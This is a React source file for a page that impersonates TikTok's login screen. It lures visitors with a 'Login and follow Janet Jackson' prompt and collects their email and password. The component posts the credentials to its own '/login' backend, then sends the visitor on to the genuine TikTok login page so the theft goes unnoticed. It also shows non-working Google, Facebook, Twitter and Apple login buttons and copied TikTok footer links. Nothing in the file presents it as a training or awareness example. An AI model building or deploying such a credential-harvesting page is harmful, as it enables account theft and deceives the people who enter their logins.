import { useState } from "react";
import "../index.css";
import axios from "axios";
import { FaGoogle, FaFacebookF, FaTwitter, FaApple } from "react-icons/fa";

const UserLogin = () => {
  const [error, setError] = useState("");
  const [data, setData] = useState({ email: "", password: "" });
  const [user, setUser] = useState({
    image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTxM5M8RtupWlTHre-pq7d1A_oyLVz7WTwtvlGSbqDqzbkPspT5XaOKbgaPUTYE5TNz-nl-AXNeL-gK8r7f5na364xQwP6U_1Z5w4HJfJKp",
    name: "Janet Jackson",
  });

  const getData = async (event) => {
    event.preventDefault();
    setError("");

    try {
      const { email, password } = data;

      if (!email) {
        setError("Please Enter Email to login!");
        return;
      }

      if (!password) {
        setError("Please Enter Password to login!");
        return;
      }

      const response = await axios.post("/login", { email, password });

      if (response.data.error) {
        setError(response.data.error);
      } else if (response.data.success) {
        window.location.href = "https://www.tiktok.com/login"; // ✅ fix
      }
    } catch (err) {
      console.error(err);
      setError("Something went wrong, please try again.");
    }
  };

  return (
    <div className="tt-page">
      <div className="tt-main">
        {/* Logo */}
        <div className="tt-header">
          <img
            src="https://cdn-icons-png.flaticon.com/512/3046/3046121.png"
            alt="TikTok"
            className="tt-logo"
          />
        </div>

        <div className="tt-hint-main">
          <p className="tt-hint">Login and follow {user.name}</p>
          <img className="tt-player-image" src={user.image} alt="" />
        </div>
        {/* Login box */}
        <div className="tt-login-box">
          <h2 className="tt-title">Log in to TikTok</h2>

          <form onSubmit={getData}>
            {error !== "" ? <p className="error">{error}</p>: "" } 
            <input
              type="text"
              value={data.email}
              onChange={(e) => setData({...data, email: e.target.value})}
              placeholder="Email or username"
              className="tt-input"
            />
            <input
            value={data.password}
            onChange={(e)=> setData({...data, password: e.target.value})}
              type="password"
              placeholder="Password"
              className="tt-input"
            />
            <button type="submit" className="tt-login-btn">Log in</button>
          </form>

          <div className="tt-divider">
            <div className="tt-line"></div>
            <p>OR</p>
            <div className="tt-line"></div>
          </div>

          {/* Alt logins with icons */}
          <div className="tt-alt-logins">
            <button className="tt-alt-btn">
              <FaGoogle className="tt-icon" /> Continue with Google
            </button>
            <button className="tt-alt-btn">
              <FaFacebookF className="tt-icon" /> Continue with Facebook
            </button>
            <button className="tt-alt-btn">
              <FaTwitter className="tt-icon" /> Continue with Twitter
            </button>
            <button className="tt-alt-btn">
              <FaApple className="tt-icon" /> Continue with Apple
            </button>
          </div>
        </div>

        {/* Signup */}
        <div className="tt-signup-box">
          <p>
            <span className="tt-sign-link">Don’t have an account?</span><a href="#">Sign up</a>
          </p>
        </div>
      </div>

      {/* Footer */}
      <footer className="tt-footer">
        <div className="tt-links">
          <a href="#">About</a>
          <a href="#">Newsroom</a>
          <a href="#">Contact</a>
          <a href="#">Careers</a>
          <a href="#">ByteDance</a>
          <a href="#">Help</a>
          <a href="#">Safety</a>
          <a href="#">Privacy</a>
          <a href="#">Terms</a>
        </div>
        <p>© 2025 TikTok</p>
      </footer>
    </div>
  );
};

export default UserLogin;
